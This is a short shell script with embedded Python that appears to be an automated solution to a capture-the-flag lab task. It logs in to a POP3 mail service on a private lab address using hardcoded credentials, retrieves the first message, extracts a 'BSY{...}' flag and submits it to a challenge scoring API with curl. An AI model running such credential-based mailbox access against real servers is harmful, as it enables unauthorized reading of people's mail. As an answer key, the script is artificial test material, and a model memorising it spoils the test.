#!/bin/sh
set -eu

flag=$(python3 - <<'PY'
import re
import socket

host, port = "172.20.0.147", 21110
sock = socket.create_connection((host, port), timeout=5)
reader = sock.makefile("rb")

def response():
    line = reader.readline()
    if not line:
        raise SystemExit("service closed the connection")
    return line.decode("ascii", "replace").rstrip("\r\n")

def command(value):
    sock.sendall(value.encode("ascii") + b"\r\n")
    return response()

if not response().startswith("+OK"):
    raise SystemExit("unexpected service greeting")
for cmd in ("USER archive", "PASS terminal", "STAT", "RETR 1"):
    reply = command(cmd)
    if not reply.startswith("+OK"):
        raise SystemExit("service rejected a mailbox command")
    if cmd == "RETR 1":
        lines = []
        while True:
            line = reader.readline()
            if not line:
                raise SystemExit("message ended unexpectedly")
            line = line.decode("ascii", "replace").rstrip("\r\n")
            if line == ".":
                break
            lines.append(line[1:] if line.startswith("..") else line)
        match = re.search(r"BSY\{[^}\r\n]+\}", "\n".join(lines))
        if not match:
            raise SystemExit("no flag found in the retrieved record")
        print(match.group(0))
command("QUIT")
sock.close()
PY
)
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\":\"scl-challenge-frame-6b533f\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
